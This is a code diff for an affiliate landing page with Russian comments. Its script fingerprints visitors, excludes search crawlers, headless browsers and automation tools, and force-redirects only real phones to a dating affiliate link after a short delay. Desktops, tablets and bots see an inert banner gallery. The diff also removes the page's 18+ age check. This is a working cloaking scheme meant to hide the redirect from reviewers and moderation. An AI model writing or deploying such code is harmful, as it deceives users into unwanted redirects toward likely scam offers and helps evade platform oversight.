@@ -34,93 +34,40 @@ header h1 {
   display: grid;
   grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
   gap: 22px;
+
   justify-items: center;
 }
 
 .banner {
   display: block;
+
   width: 300px;
   height: 250px;
 
   border-radius: 14px;
   overflow: hidden;
 
-  box-shadow: 0 6px 20px rgba(255, 77, 136, 0.25);
-
-  transition:
-    transform 0.3s ease,
-    box-shadow 0.3s ease;
-
   background: #111;
-  position: relative;
+
+  box-shadow: 0 6px 20px rgba(255,77,136,0.25);
+
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+
   cursor: pointer;
 }
 
 .banner:hover {
   transform: translateY(-6px);
-  box-shadow: 0 12px 30px rgba(255, 77, 136, 0.35);
+  box-shadow: 0 12px 30px rgba(255,77,136,0.35);
 }
 
 .banner img {
   width: 100%;
   height: 100%;
+
   display: block;
+
   object-fit: cover;
-}
-
-.popup {
-  position: fixed;
-  inset: 0;
-
-  background: rgba(0, 0, 0, 0.92);
-
-  display: none;
-  align-items: center;
-  justify-content: center;
-
-  z-index: 9999;
-}
-
-.popup-box {
-  background: #111;
-
-  padding: 35px 25px;
-  border-radius: 16px;
-
-  text-align: center;
-
-  max-width: 340px;
-  width: calc(100% - 50px);
-
-  box-shadow: 0 10px 40px rgba(255, 77, 136, 0.6);
-}
-
-.popup-box h2 {
-  margin: 0 0 25px;
-  color: #ff4d88;
-}
-
-.popup-btn {
-  padding: 15px 20px;
-  margin: 10px 5px;
-
-  border: none;
-  border-radius: 10px;
-
-  font-size: 17px;
-  cursor: pointer;
-
-  width: 140px;
-}
-
-.btn-yes {
-  background: #ff4d88;
-  color: white;
-}
-
-.btn-no {
-  background: #444;
-  color: white;
 }
 
 @media (max-width: 350px) {
@@ -154,6 +101,7 @@ header h1 {
     >
   </a>
 
+
   <a
     href="https://simal.top/click?o=3&a=6549&sub_id1=69x"
     class="banner"
@@ -163,6 +111,7 @@ header h1 {
       alt="Banner"
     >
   </a>
+
 
   <a
     href="https://stroki.top/click?o=2&a=6549&sub_id1=69x"
@@ -174,6 +123,7 @@ header h1 {
     >
   </a>
 
+
   <a
     href="https://stroki.top/click?o=2&a=6549&sub_id1=69x"
     class="banner"
@@ -183,6 +133,7 @@ header h1 {
       alt="Banner"
     >
   </a>
+
 
   <a
     href="https://simal.top/click?o=3&a=6549&sub_id1=69x"
@@ -197,75 +148,63 @@ header h1 {
 </div>
 
 
-<div class="popup" id="agePopup">
-
-  <div class="popup-box">
-
-    <h2>Are you 18 years old?</h2>
-
-    <button
-      class="popup-btn btn-yes"
-      id="yesBtn"
-      type="button"
-    >
-      Yes, I'm 18+
-    </button>
-
-    <button
-      class="popup-btn btn-no"
-      id="noBtn"
-      type="button"
-    >
-      No
-    </button>
-
-  </div>
-
-</div>
-
-
 <script>
+
+/* =========================================
+   КУДА ОТПРАВЛЯЕМ МОБИЛЬНЫЕ
+========================================= */
 
 const mobileRedirectUrl = "https://grzvkg.datingcorrner.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=212364&s2=2185091";
 
-function isRealPhone() {
+
+/* =========================================
+   ОПРЕДЕЛЕНИЕ ОС
+========================================= */
+
+function getMobileOS() {
 
   const ua = navigator.userAgent || "";
 
-  /*
-   * ANDROID
-   *
-   * Android UA содержит Linux,
-   * поэтому нельзя сначала блокировать все UA с "linux".
-   */
 
-  if (/Android/i.test(ua)) {
+  /* ANDROID PHONE */
 
-    // Большинство Android-планшетов не содержат Mobile
-    if (/Mobile/i.test(ua)) {
-      return true;
-    }
-
-    return false;
+  if (
+    /Android/i.test(ua) &&
+    /Mobile/i.test(ua)
+  ) {
+    return "android";
   }
 
 
-  /*
-   * IPHONE / IPOD
-   */
+  /* IPHONE / IPOD */
 
   if (/iPhone|iPod/i.test(ua)) {
-    return true;
+    return "ios";
   }
 
 
   /*
-   * iPad специально НЕ считаем телефоном.
-   */
+    Всё остальное:
 
-  return false;
+    Windows
+    macOS
+    Linux
+    ChromeOS
+    Android tablet
+    iPad
+    Unknown
+    странный/пустой UA
+
+    → UNKNOWN
+  */
+
+  return "unknown";
 }
 
+
+/* =========================================
+   ПРОСТАЯ ПРОВЕРКА БОТОВ
+========================================= */
 
 function isObviousBot() {
 
@@ -274,98 +213,114 @@ function isObviousBot() {
   const botPattern =
     /googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebookexternalhit|twitterbot|linkedinbot|semrush|ahrefs|mj12bot|dotbot|headlesschrome|phantomjs|selenium|puppeteer|playwright|python-requests|curl\/|wget|scrapy/i;
 
+
+  /* BOT ПО USER AGENT */
+
   if (botPattern.test(ua)) {
     return true;
   }
+
+
+  /* AUTOMATION / WEBDRIVER */
 
   if (navigator.webdriver === true) {
     return true;
   }
 
+
   return false;
 }
 
 
-function blockBannerClicks() {
+/* =========================================
+   ЗАПУСК
+========================================= */
 
-  document.querySelectorAll(".banner").forEach(function(banner) {
+document.addEventListener("DOMContentLoaded", function () {
 
-    banner.addEventListener("click", function(event) {
-
-      event.preventDefault();
-      event.stopPropagation();
-
-      console.log("[Blocked] Banner click ignored");
-
-    });
-
-  });
-
-}
-
-
-function hidePopup() {
-
-  const popup = document.getElementById("agePopup");
-
-  if (popup) {
-    popup.style.display = "none";
-  }
-
-}
-
-
-document.addEventListener("DOMContentLoaded", function() {
-
-  const phone = isRealPhone();
+  const os = getMobileOS();
   const bot = isObviousBot();
 
-  console.log(
-    "[Debug]",
-    "phone:",
-    phone,
-    "| bot:",
-    bot
-  );
 
-  console.log(
-    "[UA]",
-    navigator.userAgent
-  );
+  console.log("===== DEVICE CHECK =====");
+
+  console.log("OS:", os);
+  console.log("BOT:", bot);
+  console.log("UA:", navigator.userAgent);
+
+  console.log("========================");
 
 
-  /*
-   * REAL PHONE
-   */
+  /* =====================================
+     РАЗРЕШАЕМ ТОЛЬКО:
 
-  if (phone && !bot) {
+     ANDROID PHONE
+     IPHONE / IPOD
 
-    console.log(
-      "[Redirect]",
-      "Phone detected → redirect in 1300ms"
-    );
+     И ТОЛЬКО ЕСЛИ НЕ BOT
+  ===================================== */
 
-    setTimeout(function() {
+  const redirectAllowed =
+    (os === "android" || os === "ios") &&
+    bot === false;
 
-      window.location.replace(mobileRedirectUrl);
+
+  if (redirectAllowed) {
+
+    console.log("[ALLOW] Mobile redirect");
+
+    setTimeout(function () {
+
+      window.location.replace(
+        mobileRedirectUrl
+      );
 
     }, 1300);
 
-    return;
+  } else {
+
+    /*
+      UNKNOWN
+      PC
+      TABLET
+      BOT
+
+      → НИКУДА НЕ ПЕРЕХОДИМ
+    */
+
+    console.log(
+      "[BLOCK]",
+      "No redirect",
+      {
+        os: os,
+        bot: bot
+      }
+    );
+
+
+    /* Блокируем переходы по баннерам */
+
+    document
+      .querySelectorAll(".banner")
+      .forEach(function (banner) {
+
+        banner.addEventListener(
+          "click",
+          function (event) {
+
+            event.preventDefault();
+            event.stopPropagation();
+
+            console.log(
+              "[BLOCK] Banner click ignored"
+            );
+
+          }
+        );
+
+      });
+
   }
-
-
-  /*
-   * DESKTOP / TABLET / BOT
-   */
-
-  console.log(
-    "[Blocked]",
-    "Desktop, tablet or bot → staying on gallery"
-  );
-
-  blockBannerClicks();
-  hidePopup();
 
 });
 
